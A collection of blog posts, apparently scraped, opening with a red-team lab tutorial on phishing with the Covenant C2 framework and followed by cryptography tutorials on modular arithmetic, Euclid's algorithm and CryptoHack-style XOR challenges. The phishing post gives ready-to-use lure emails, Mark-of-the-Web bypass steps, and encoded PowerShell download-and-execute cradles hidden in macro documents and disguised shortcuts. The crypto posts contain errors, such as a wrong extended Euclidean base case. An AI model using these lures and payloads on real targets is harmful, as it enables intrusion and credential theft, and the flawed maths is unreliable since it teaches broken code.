malicious links or providing confidential information. In this blog, we will explore various techniques and tools used in phishing attacks with a specific focus on Covenant. Lab Architecture # I used the following github repo to build my lab and then manually configure the active directory with the DC, 2 workstations and a mail server. You can refer to this step by step guide by 05t3 on how to setup the lab You don\u0026rsquo;t need the architecture above to follow through the lab. A kali VM with covenant and a windows VM would suffice Attack Flow # The attack begins with a password spray to a public-facing mail server compromising a user with the credentials a.tarolli:Summer2021!. To gain initial access to the network, the attacker forwards a phishing email to the sender\u0026rsquo;s list of a.tarolli. A user s.chisholm gets compromised in this phishing attack gaining the attacker foothold on the external network where they pivot into the internal network and own the DC. Various attacks, enumeration and post-exploitation techniques were conducted by the attacker throughout the lifecycle of the attack. We will look into them in future blogs. Let us look into the various techniques the attacker can employ to conduct a successful phishing attack. OutWord Email Phishing with Covenant # Pretext # The attacker in this case conducted a spear-phishing campaign where various groups in the organizations receive emails concerning office365 rollouts. You can use sample pretexts from github to generate your phishing emails. I picked the office365Rollout.html for this attack. SUBJECT: URGENT: Incomplete Security Training Greetings, According to our training records, you have not completed the following annual training requirements: • Information Security Password Policy Training (SA46189) If these courses are not completed by 30/03/2023, your supervisor will be notified daily until the courses have been completed. We take great pride in maintaining a secure environment, and our annual training requirements play a large role in this success. Click this link to download the training document We understand that you and all of our employees here work very hard and maintain busy work schedules. We appreciate your prompt attention to ensure that we all stay within regulatory compliance! Thanks, Compliance Department Payload Generation and Hosting # We proceed to generate our payload on Covenant. In the listeners tab in Covenant, we create a new listener by clicking Create\nUpdate the IP and create your listener\nIn the launcher tab, we create a Powershell launcher Ensure you use high port numbers to prevent Covenant from getting permissions issues Configure the launcher options as shown In the host tab, modify the path name of the launcher, click host to generate the payload We are going to create a phishing document using a tool called Out-Word Download the script to a windows machine that has Office installed in order to generate a word document with the embedded payload Out-Word can only work with a windows machine that has office installed We execute the commands shown to generate the word document. We utilize the payload we created in the above step to create this file PS C:\\Users\\s.chisholm\\Desktop\u0026gt; . .\\Out-Word.ps1 PS C:\\Users\\s.chisholm\\Desktop\u0026gt; Out-Word -Payload \u0026#34;powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANwAyAC8AcgBlAHYALgBwAHMAMQAnACkA\u0026#34; -OutputFile Policies.doc Copy the file from your windows machine back to your attacking machine. We proceed to host the malicious payload Go to the Listeners section in Covenant. Click create and upload your document Upload your document and host it on your server Send the phishing email with an updated link to download the document as shown: Receiving the connection # To get the connection back to covenant, the target needs to open the document and enable the macros. We login as s.chisholm user on workstation 1 Download the document Trigger the payload by opening the file and enabling editing. This will execute the embedded payload automatically We receive the grunt on Covenant In the Grunts tab, interact with the target by supplying a WhoAmI command. ISO Email Phishing with covenant # It is common to see malware in various different container formats such as zip, iso, rar, 7z There are several reasons to do this, the main being for evading MOTW, which we will discuss below MOTW (Mark Of The Web) # The Mark of the Web is essentially a metadata attribute that is automatically added to files downloaded from the internet by modern browsers. It is represented as a comment in the file\u0026rsquo;s header and contains information about the source of the file and the website from which it was downloaded. It allows web browsers to identify and treat files downloaded from the internet differently from files on the local computer.\nIf the file has the Mark of the Web, the browser may restrict certain actions, such as running scripts or executing certain types of code, to protect the user from potential security threats. The browser may also display a warning message to the user to alert them to the potential risks associated with opening the file.\nMOTW Bypass # A research from 2020 disclosed that some container file formats such as iso, vhd, vhx do not propagate the MOTW flag onto inner files upon auto mount or extraction. - link We can use this tool to pack payloads into ISO files. It also well documents how threat actors bypass MOTW using ISO files. ISO Creation using PackMyPayload # Let us see how we can generate the ISO files and construct a pretext to send the ISO to our target via email\nFor this exercise, we shall generate an executable using Covenant\nIn the Launchers tab, select the Binary options as shown\nGenerate and download the binary file Pack it using PackMyPayload Send the email to the target Receiving the connection # Opening the iso file will reveal the following We receive the grunt after executing the file LNK Phishing # An .lnk file is a windows shortcut file, simply a pointer to an original file. It contains special metadata that can allow us to execute Powershell, VBScript, MSHTA or even execute commands from another file dropped by the .lnk You can easily create an lnk file that runs the powershell encoded command from Covenant to give you a shell as shown: Create a shortcut I made a shortcut to the powershell binary located on C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe It will create your shortcut file. We will proceed to edit some metadata on the shortcut, right click and go to properties We edit the target to include the powershell payload from Covenant I had initially used the encoded launcher in the target but the command was too long, so I used the unencoded version instead Change the icon as well I selected this C:\\Program Files\\Windows Defender\\MpCmdRun.exe and my icon file and it appears as shown Our malicious lnk looks a bit convincing right?\nThe following is a quicker alternative to creating the lnk file. Run the powershell script to generate the malicious lnk\nYou may have to customize some of the parameters such as where to dump the lnk file\n$command = \u0026#39;Start-Process c:\\shell.cmd\u0026#39; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) $obj = New-object -comobject wscript.shell $link = $obj.createshortcut(\u0026#34;c:\\Users\\saudi\\Desktop\\Q1 Security Update.lnk\u0026#34;) $link.windowstyle = \u0026#34;7\u0026#34; $link.targetpath = \u0026#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; $link.iconlocation = \u0026#34;C:\\Program Files\\Windows Defender\\MpCmdRun.exe\u0026#34; $link.arguments = \u0026#34;-Nop -sta -noni -w hidden -encodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4ANwAyADoAOQAwADAAMAAvAHIAZQB2AC4AcABzADEAJwApAA==\u0026#34; $link.save() Packing the lnk # We can use packmyload to perform an MOTW bypass and create an iso file that contains the lnk Pretexting # I used the following pretext\nGood Morning, The Infrastructure Team has recently identified a critical security vulnerability in our system and are now rolling out a patch to fix it. As part of this process, you will be required to download the following Security Update, double click and run the updater. Ignore any warnings We apologize for any inconvenience caused but rest assured that these measures have been taken to protect you from potential threats. Thank you! Download the iso file and execute the lnk file to get a grunt Conclusion # We have looked into some of the common phishing techniques used during initial access. Although all of them would obviously trigger most security defenses, these are just standard procedures to generate and conduct phishing campaigns. All of the discussed initial access methods can be done with whatever C2 you choose and also different file formats like HTA files. In future blogs, we can look into how to generate more covert and complex phishing campaigns that can bypass modern EDRs ","date":"25 March 2023","permalink":"/posts/2023-03-25_red_team01/","section":"Posts","summary":"Introduction # Phishing attacks have become increasingly sophisticated and prevalent over the years, posing a significant threat to individuals and organizations alike.","title":"Email Phishing with Covenant"},{"content":" Introduction # What happens when the hour hand of your wall clock crosses 12? It simply goes back to 1. That is modular arithmetic. When numbers wrap around upon reaching a given point. When you get to hour 13 on your wall clock, it goes back to 1. 14 becomes 2, 15 becomes 3 and so on\u0026hellip; A concept you understand from when you learnt how to tell the time Looking at the clock in terms of modular arithmetic, when we cross over the clock at 12 and go to 13, we instead switch to 1 because 1 is the remainder of 13 mod 12. The range of numbers in this case is bounded by 12 and any remainders will simply be in this range. This concept is very important in cryptography as it is fundamental to computing private and public keys in RSA as you will see in future blogs. This is true because modular arithmetic introduces the perspective of finiteness, allowing us to work with a range of values defined by a modulo operation. This makes it more efficient when handling large prime numbers and factorization in RSA. We will utilize the concepts learnt before - euclidean algorithm and its extended version, to understand how to compute various operations in modular arithmetic Theory of Congruences # The theory of congruences deals with the concept of numbers being equivalent or congruent to each other, based on a given modulus.\nSometimes also referred to as an equivalence relation, it follows the principle that algebraic operations done with equivalent elements will yield equivalent results\nElements are said to be equivalent to each other based on a specific relationship for example:\nLet\u0026rsquo;s take for example an equation: A ≡ B(mod C), we say that A is congruent to B modulo C, which means that A and B have the same remainder when divided by C. Meaning A and B are equivalent or in the same equivalence class\nWe can also look at it this way:\nA ≡ B(mod C), therefore\nA - B is divisible by C\nSo if we had the following:\n37 ≡ 57(mod 10)\n37 - 57 is divisible by 10\n-20 is divisible by 10\nSo 37 and 57 are in the same equivalence class\nLet’s apply that knowledge to solve for x in the following equation\n11 = x mod 6 According to the theory of congruences, both 11 and x have the same remainder when divided by 6. Or, 11 - x is going to be divisible by 6\nWe can therefore calculate x by taking 11 mod 6.\n11 mod 6 = 5, therefore\n11 = 5 mod 6\n11-5 = 6 which is divisible by 6\nWe can also say that 11 and 5 are in the same equivalence class because they both have the same remainder when divided by 6.\nThese equivalence relationships are bound by various properties that will help us understand other concepts:\nProperties of an equivalence relation # Reflexivity: every element is related to itself, meaning A is equivalent to A. So a = a (mod n) Symmetry: if A is equivalent to B, then B is equivalent to A. So a = b(mod n) and b = a (mod n) Transitivity: if A is equivalent to B and B is equivalent to C, then A is equivalent to C. So if a = b (mod n) and b = c(mod n), then a = c (mod n) Modular Inverse # Before we talk about modular inverses. Let\u0026rsquo;s start by understanding what an inverse is. You have probably come across the concept in your algebra class, where if you multiply a number by its inverse, you get 1 The inverse of a number 10 would be 1/10 also written as 10 -1. So 10 * 1/10 is 1 Note that 0 does not have an inverse With the above concept of inverses in mind, in modular arithmetic, a modular inverse of a number a is another number b such that their product is congruent to 1 modulo a given modulus m. In other words, if we have a * b ≡ 1 (mod m), then b is the modular inverse of a modulo m. This can also be written as a * b (mod m) = 1. This is important because we are going to use this to calculate modular inverses in the next section Modular inverses exist if and only if a and m are coprime, meaning they have no common factors other than 1. If a and m are not coprime, then there is no integer b that satisfies the congruence equation. Calculating modular inverses: Naive approach # Enough theory, let us see how we can use the euclidean algorithm and its extended version to compute modular inverses\nFind the modular inverse of 3 mod 5\nThe expression can be written as 3 * b ≡ 1 (mod 5)\nYou Calculate 3 * b mod 5 for b values 0 through c - 1\nSo we plug in the values 0 - 4 for b till we find an equation that gives 1 as the answer\n3 * 0 mod 5 = 0\n3 * 1 mod 5 = 3\n3 * 2 mod 5 = 1 \u0026lt;\u0026mdash;\u0026mdash;\u0026mdash;- answer\nSo the modular inverse of 3 mod 5 is 2\nLet us build some intuition with this calculations:\nFind the modular inverse of 3 mod 13\nThe expression can be written as\n3 * b ≡ 1 (mod 13)\nWe ask ourselves this question, what number when multiplied by 3 and divided by 13 will give 1 as the answer?\n3 * 0 mod 13 = 0\n3 * 1 mod 13 = 3\n3 * 2 mod 13 = 6\n3 * 3 mod 13 = 9\n3 * 4 mod 13 = 12\n3 * 5 mod 13 = 2\n3 * 6 mod 13 = 5\n3 * 7 mod 13 = 8\n3 * 8 mod 13 = 11\n3 * 9 mod 13 = 1 \u0026lt;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; answer (27 mod 13 is 1)\nThe modular inverse of 3 mod 13 becomes 9\nCalculating modular inverses: Euclidean algorithm # We explained in detail how to calculate the euclidean algorithm and its extended version in the previous blog.\nSeeing that it\u0026rsquo;s an efficient method for finding GCD, we can apply the algorithm and its extended version to calculate coefficients that will find us the modular inverse\nFind the modular inverse of 197 mod 3000\nThe expression can be written as\n197 * b ≡ 1 (mod 3000) or\n197 * b (mod 3000) = 1\nStep 1: Find the GCD of 197 and 3000 # We can do this using the euclidean algorithm\n3000 = 15(197) + 45\n197 = 4 (45) + 17\n45 = 2(17) + 11\n17 = 1(11) + 6\n11 = 1(6) + 5\n6 = 1(5) + 1\nWe can see that the GCD of the 2 numbers is 1. There are no common factors between the 2 numbers meaning the numbers are co-prime, which was a condition to find these modular inverses\nStep 2: Express 1 as the difference between multiples of 3000 and 197 # We generally want to follow the pattern of this equation: 197 * b (mod 3000) = 1, to find the multiples, we perform back substitution as we saw in the previous blog post with the extended euclidean algorithm\n1 = 6- 1(5)\n= 2(6) - 1(11)\n= 2(17) - 3(11)\n= 8(17) - 3(45)\n= 8(197) - 3(45)\n= 533(197) - 35(3000) \u0026lt;\u0026mdash;\u0026mdash;\u0026mdash; We reach this point where we get the multiples of 3000 and 197 that will give us 1\nStep 3: Apply modulo to both sides # So,\n1 = 533(197) - 35(3000)\nBecomes,\n1 (mod 3000)= (533(197) - 35(3000))(mod 3000)\n1 = 533(197)(mod 3000) # 3000 mod 3000 is equal to 0 so that part of the equation is removed\nThe modular inverse becomes 533\nThe operations discussed with modular inverses are crucial in key generation in various cryptosystems like RSA\nConclusion # I hope your brains are not fried yet :) In the future blogs, we will see how we can use simple prebuilt tools to perform these computations for us and make our lives easier :D. See you in the next blog where we introduce even cooler math concepts ","date":"18 March 2023","permalink":"/posts/2023-03-19_modular_arithmetic/","section":"Posts","summary":"Introduction # What happens when the hour hand of your wall clock crosses 12?","title":"Cryptography - Modular Arithmetic"},{"content":"Introduction # In the previous blog, we did a general introduction to cryptography and the various important libraries and techniques for handling encrypted data with python. We introduce some basic math concepts in this blog, where we talk about GCD and the euclidean algorithm, its extended version and how to form recursive algorithms in python for them. Why should you understand these concepts? # As we move into public key cryptography, all these concepts form a fundamental basis for understanding cryptosystems and cryptographic attacks. Some of the computations may be a bit confusing at first but grasping the logic behind these math algorithms will be important for you as we move forward. Greatest Common Divisor (GCD) # Let us begin by defining these 2 terms:\nFactors - a number that divides another number evenly. i.e if 2 is a factor of 10, then 2 can divide 10 into 5 equal parts Common Factors - if the factor of a number is the factor of another number, then it is said to be a common factor i.e if 2 is a factor of 10 and 4, then 2 is said to be a common factor GCD is then the largest common factor of 2 or more positive integers\nSuppose we have 2 integers a=12, b=18, the factors of a are 2,3,4,6 while the factors of b are 2,3,6,9\nThe greatest common divisor of the 2 would be 6\nEuclidean\u0026rsquo;s Algorithm # Also known as Euclid\u0026rsquo;s algorithm, this is an efficient method of computing the GCD between 2 numbers. The algorithm is based on the following GCD property: If we have 2 numbers, the GCD of the numbers does not change if the larger number is replaced by its remainder when divided by the smaller of the two\ni.e if a \u0026gt; b then GCD(a,b) = GCD(b,a%b)\nPoint to note\nOur operations will be expressed as follows dividend = quotient * divider + remainder For example, if we divide 48 by 6, we can express this as:\n48 ÷ 6 = 8 + 0\n48 - dividend\n6 - divider\n8 - quotient\n0 - remainder\nRewrite in terms of the formula\n48 = 8 * 6 + 0\nExample # We start by dividing the larger number by the smaller number to get the quotient and remainder:\n54 = 2 × 21 + 12\nNext, we divide the smaller number by the remainder to get another quotient and remainder:\n21 = 1 × 12 + 9\nWe repeat the process with the new pair of numbers:\n12 = 1 × 9 + 3\nFinally, we have:\n9 = 3 × 3 + 0\nSince the remainder is now 0, we have found the GCD of the original two numbers. In this case, the GCD of 54 and 21 is 3.\nBy replacing the larger number with its remainder by dividing it by the smaller number, we get a smaller pair of numbers. Repeating this process results in progressively smaller pairs of numbers until both numbers are equal.\nHow it works visually # Suppose we have 2 big numbers represented as 2 piles of stones. We are going to find the GCD of the 2 piles of stones. Pile B is bigger than A. If we find copies of stones from a smaller pile in the larger pile, we subtract the copies. We start by finding copies of pile A in pile B as shown below. Subtract the copies from pile B We end up with the following resulting pile Pile B is now smaller than A. We find copies of pile B in pile A Subtract the copy of pile B from pile A We end up with the following resulting pile Pile A is now smaller than B. We find copies of pile A in pile B Subtract the copies of pile A from pile B Find copies of pile B (which is now smaller), in pile A Subtract the copy Now that the 2 piles are equal, it means we have found the GCD which is 3 The 2 numbers representing the pile are 21 and 54 whose GCD is 3 Note\nRepeated subtraction is just a division operation We stop our operations when we divide a and b and get a remainder of 0 which means the numbers are either equal or one of the 2 numbers is a 0, making the other number the GCD Permission to use the images in this section was exclusively granted by the owner The algorithm in python # Solution # We will utilize recursion to break down the large problem into smaller sub-problems and find the solution The first step is to come up with a base case. The base case tells us when we should stop our calculation. We saw from the above computations that we stop when the numbers are equal or we get a 0. If b is zero, we have found the GCD of a and b, which is a. Therefore, we return a as the result Otherwise, we perform a recursive call when we calculate the remainder of a divided by b using the modulo operator %, and call the gcd function recursively with the arguments b and a % b. This operation replaces the larger number with its remainder when divided by the smaller number Code # The following is a short implementation of the algorithm def main(a,b): if b == 0: return a return main(b,a%b) print(main(54,21)) #3 The order of the numbers does not matter. If you supply a small number followed by a big number as your order, the algorithm will swap the numbers in the next step Extended Euclidean Algorithm # This is an extension to the euclidean algorithm where in addition to the GCD of integers a and b, we compute x and y such that\nax + by = gcd(a,b)\nThe GCD of 54 and 21 is 3.\nThe steps used were:\nstep 1: 54 = 2 × 21 + 12\nstep 2: 21 = 1 × 12 + 9\nstep 3: 12 = 1 × 9 + 3\nstep 4: 9 = 3 × 3 + 0\nNow we work backward from step 3 (we don\u0026rsquo;t use step 4 because it has a remainder of 0) to find x and y:\nStep a: 3 = 12 - 1 × 9\nStep b: 3 = 12 - 1 × (21 - 1 × 12) 3 = 2 × 12 - 1 × 21\nStep c: 3 = 2 × (54 - 2 × 21) - 1 × 21\nstep d: 3 = 2 × 54 - 5 × 21\nIn step a, we substitute the equation from step 3 (12 = 1 × 9 + 3) to express 3 as a linear combination of 12 and 9.\nIn step b, we substitute the equation from step 2 (21 = 1 × 12 + 9) to express 3 as a linear combination of 12 and 21\nIn step c, we substitute the equations from step 1 to express 3 as a linear combination of 54 and 21. We continue this process until we have expressed the GCD as a linear combination of the original two numbers.\nWe end up with 2 and -5 as our coefficients\nThe algorithm in python # Solution # We perform another recursive algorithm for this case as well. It may seem intimidating but it gets pretty simple once you see how we generate the equations for coming up with the coefficients\nSo far, we know that\nax + by = gcd(a,b)\nThe gcd(a,b) can also be rewritten as gcd(b,a%b) which is a recursive operation so:\nax + by = gcd(b,a%b)\nWe can rewrite gcd(b,a%b) in the form ax2 + by2 as shown:\ngcd(b,a%b) = b ⋅ x2 + (a%b) ⋅ y2\nRecall that we said dividend = quotient * divider + remainder.\nIn the form of a and b: a = b*q + r where r is a%b and q is a/b\nSo, the remainder can be rewritten as remainder = dividend - (quotient * divider).\na%b = a - (a/b) ⋅ b\nRewrite the remainder\ngcd(b,a%b) = b⋅x2 + [a - (a/b) ⋅ b] ⋅y2 gcd(b,a%b) = b⋅x2 + a⋅y2 - [a/b ⋅ b] ⋅ y2\nFactor the b\ngcd(b,a%b) = a⋅y2 + b[x2 - (a/b)]⋅ y2\nReplace with the original\nax + by = a⋅y2 + b[x2 - (a/b)] ⋅ y2\nSolve for x\nax = a⋅y2\nx = y2\nSolve for y\nby = b[x2 - (a/b)]\ny = [x2 - (a/b)]⋅ y2\nWe recursively find x1 and y2 and then find x and 2\nBase Case # Just like in the euclidean algorithm, we check if one of the numbers between a and b is 0. Suppose b is 0 then: ax +0y = gcd(a,b) = a\nThat results in x = 1 and y = 1 Code # def extended(a, b): if b == 0: return (1, 1) else: x2, y2 = extended(b, a % b) y = x2 - (a // b) * y2 x = y2 return (x, y) You can see how we use the equations we computed to form a base case and recursive algorithm to find our coefficients Conclusion # We have seen how we can compute GCDs of large numbers efficiently using the euclidean algorithm. It is very fundamental in many cryptographic systems and we will see its application in the next blogs. ","date":"12 March 2023","permalink":"/posts/2023-03-12_euclidean_modular/","section":"Posts","summary":"Introduction # In the previous blog, we did a general introduction to cryptography and the various important libraries and techniques for handling encrypted data with python.","title":"Cryptography - Euclidean Algorithm"},{"content":"Introduction # I spent the better part of the start of my year doing a lot of problem-solving with Python (secretly preparing for interviews :D ). Most of that entailed revisiting data structures and algorithms.\nBecause I am not landing any Google or Microsoft roles anytime soon :) , that knowledge will not go to waste. So let\u0026rsquo;s learn some cryptography with Python!\nI thought this would be a fun experience to document how I solve various cryptography challenges starting from basic beginner-level problems from Cryptohack or Cryptopals to advanced-level problems. This first blog will be focused on laying the groundwork and getting our hands dirty with some practical basic problems that will be used to build upon future challenges\nLet us look at various important methods and concepts that will serve as our building blocks\nord() and chr() # Ascii is a character encoding format that can be used to represent characters/letters. Each letter is assigned a number from 0-127\nThe ord() function in python can be used to convert ascii characters to their corresponding integers while chr() does the opposite.\n\u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;A\u0026#39;) 65 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;a\u0026#39;) 97 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;B\u0026#39;) 66 \u0026gt;\u0026gt;\u0026gt; chr(65) \u0026#39;A\u0026#39; \u0026gt;\u0026gt;\u0026gt; chr(97) \u0026#39;a\u0026#39; \u0026gt;\u0026gt;\u0026gt; Challenge # Using the below integer array, convert the numbers to their corresponding ASCII characters to obtain a flag. [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]\nSolution # The solution is pretty straight-forward We define a function that takes in an array. Create a result array to store the output of our conversion Iterate through the int_array which is our input, use chr on each array item to get the corresponding ASCII value Append to our result and return the output def convert(int_arr): res = [] for i in int_arr: res.append(chr(i)) return res if __name__==\u0026#39;__main__\u0026#39;: print(convert([99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125])) # [\u0026#39;c\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;}\u0026#39;] Hex # We\u0026rsquo;ve mentioned ASCII in our previous example. During encryption, it is common to end up with gibberish ASCII output. That is where hexadecimal comes in. It is a 16-bit number system which means it can represent ASCII in 16 digits/values. To use hex effectively, let us see the different ways we can manipulate it. bytes.fromhex() and .hex() # These methods perform an easy conversion between hex and ascii Note that .hex() only works with bytes and not strings\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d\u0026#39;) b\u0026#39;crypto{You_will_be_working_with_hex_strings_a_lot}\u0026#39; \u0026gt;\u0026gt;\u0026gt; output = b\u0026#39;crypto{You_will_be_working_with_hex_strings_a_lot}\u0026#39; \u0026gt;\u0026gt;\u0026gt; output.hex() \u0026#39;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d\u0026#39; \u0026gt;\u0026gt;\u0026gt; Base64 # Base64 is another common character encoding format used to represent ASCII in form of 64 characters where each character is equal to 6 bits b64encode and b64decode() # To use these methods in python you first import base64. In the below example, we convert a hex string to ASCII bytes, then convert the bytes to bas64 \u0026gt;\u0026gt;\u0026gt; import base64 \u0026gt;\u0026gt;\u0026gt; bytes_converted = bytes.fromhex(\u0026#39;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf\u0026#39;) \u0026gt;\u0026gt;\u0026gt; base64.b64encode(bytes_converted) b\u0026#39;crypto/Base+64+Encoding+is+Web+Safe/\u0026#39; \u0026gt;\u0026gt;\u0026gt; Numbers and Bytes # It is important to know how to handle numbers since some cryptosystems like RSA deal with mathematical computations so it is good to know how to convert characters to numbers PyCryptodome # This library comes packed with methods that will be useful for us. You can install it with pip as shown bytes_to_long and long_to_bytes # These are methods that can be used to quickly convert between integers and bytes as shown: \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import * \u0026gt;\u0026gt;\u0026gt; message = b\u0026#39;HELLO\u0026#39; \u0026gt;\u0026gt;\u0026gt; bytes_to_long(message) 310400273487 \u0026gt;\u0026gt;\u0026gt; long_to_bytes(310400273487) b\u0026#39;HELLO\u0026#39; \u0026gt;\u0026gt;\u0026gt; XOR # One not both is how I quickly remember XOR operations. It is commonly denoted as ⊕ or the caret operator ^ Input 1 Input 2 Output 0 0 0 0 1 1 1 0 1 1 1 0 When dealing with longer characters, we XOR bit by bit. pwntools is a nice library that has an XOR method we can use to work with any data types. \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; xor(b\u0026#39;abc\u0026#39;,13) b\u0026#39;lon\u0026#39; \u0026gt;\u0026gt;\u0026gt; xor(13,13) b\u0026#39;\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; xor(123,13) b\u0026#39;v\u0026#39; \u0026gt;\u0026gt;\u0026gt; XOR Properties # Suppose a chain of encryptions were done on a plaintext and we have a resulting ciphertext, how do we go about reversing the ciphertext? This is where the XOR properties come into play. There are 4 main properties to look into XOR is Commutative the order does not matter a ^ b = b ^ a XOR is Associative When performing an XOR operation on three or more values, the order in which we group those values does not affect the result of the operation. a ^ (b ^ c) = (b ^ a) ^ c = c ^ (a ^ b) Identity An element XOR\u0026rsquo;d with 0 remains unchanged a ^ 0 = a Self-inverse An element XOR\u0026rsquo;d with itself evaluates to 0 a ^ a = 0 Challenge: Undoing chain of encyrptions # Given the following chain of encryptions, find the FLAG value KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313 KEY2 ^ KEY1 = 37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e KEY2 ^ KEY3 = c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1 FLAG ^ KEY1 ^ KEY3 ^ KEY2 = 04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf Solution # Since we have the value of KEY1, we can calculate the rest as follows Note that for all operations, we need to convert the hexadecimal to bytes before working with the data.\nFind the value of KEY2 Find the value of KEY3 Find the value of FLAG \u0026gt;\u0026gt;\u0026gt; KEY1=bytes.fromhex(\u0026#39;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313\u0026#39;) \u0026gt;\u0026gt;\u0026gt; KEY2=xor(KEY1,bytes.fromhex(\u0026#39;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; KEY3=xor(KEY2,bytes.fromhex(\u0026#39;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; FLAG=xor(KEY1,KEY2,KEY3,bytes.fromhex(\u0026#39;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; FLAG b\u0026#39;crypto{x0r_i5_ass0c1at1v3}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Challenge: Favourite Byte # We have learnt some fundamentals in working with XOR. Let\u0026rsquo;s apply that to solve some more challenges As mentioned for the millionth time, convert to bytes when given data\nI\u0026rsquo;ve hidden some data using XOR with a single byte, but that byte is a secret. Don\u0026rsquo;t forget to decode from hex first:\n73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d\nSolution # We first convert our hex to bytes We mentioned that ASCII goes from 0-127 characters, we can iterate over that range converting each integer to ASCII bytes For each element converted to ASCII bytes, we XOR it with our target input from pwn import * def main(input_hex): input_bytes = bytes.fromhex(input_hex) #1 for i in range(0,128): #2 result = xor(input_bytes,chr(i).encode(\u0026#39;utf-8\u0026#39;)) #3 if b\u0026#39;crypto\u0026#39; in result: print(result) break if __name__ == \u0026#39;__main__\u0026#39;: main(\u0026#39;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d\u0026#39;) # b\u0026#39;crypto{0x10_15_my_f4v0ur173_by7e}\u0026#39; I added a check to filter for the bytes \u0026lsquo;crypto\u0026rsquo; which is part of the flag format that we expect in the output Challenge: You either know, XOR you don\u0026rsquo;t # This is an interesting challenge that relies on the partial knowledge of our output to get the key Solution # We know part of the flag crypto{. We can begin by XORing that with the ciphertext and see if we get anything meaningful that can help us get the key \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; flag = bytes.fromhex(\u0026#39;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104\u0026#39;) \u0026gt;\u0026gt;\u0026gt; output = xor(flag,b\u0026#39;crypto\u0026#39;) \u0026gt;\u0026gt;\u0026gt; output b\u0026#39;myXORk}:rVU\\x10DFWg)adxE+dQFTX\\x0fS[Me$~s\\x11EF(euk\u0026#39; \u0026gt;\u0026gt;\u0026gt; output = xor(flag,b\u0026#39;crypto{\u0026#39;) \u0026gt;\u0026gt;\u0026gt; output b\u0026#39;myXORke+y_Q\\x0bHOMe$~seG8bGURN\\x04DFWg)a|\\x1dTM!an\\x7f\u0026#39; From the above you can see that we XOR\u0026rsquo;d using b\u0026rsquo;crypto\u0026rsquo; then proceeded to add the bracket to b\u0026rsquo;crypto{\u0026rsquo; and got an output that had some information that allows us to get the key We can take an educated guess and try using b\u0026rsquo;myXORkey\u0026rsquo; which is part of the output of the secret and obtain the flag \u0026gt;\u0026gt;\u0026gt; output = xor(flag,b\u0026#39;myXORkey\u0026#39;) \u0026gt;\u0026gt;\u0026gt; output b\u0026#39;crypto{1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll}\u0026#39; \u0026gt;\u0026gt;\u0026gt; We get the flag CONCLUSION # We have covered some basic building blocks that will serve to be very useful in understanding other cryptography concepts. See you in the next blog! ","date":"1 March 2023","permalink":"/posts/2023-03-01_crypto_basics/","section":"Posts","summary":"Introduction # I spent the better part of the start of my year doing a lot of problem-solving with Python (secretly preparing for interviews :D ).","title":"Cryptography - The Basics"},{"content":" Introduction # In the second part of the secure code review series, we look at path traversal bugs. A pretty simple bug to exploit with a very high impact on vulnerable systems. The path/directory traversal bug allows an attacker to read arbitrary files on the server hosting the application. The impact may lead to the 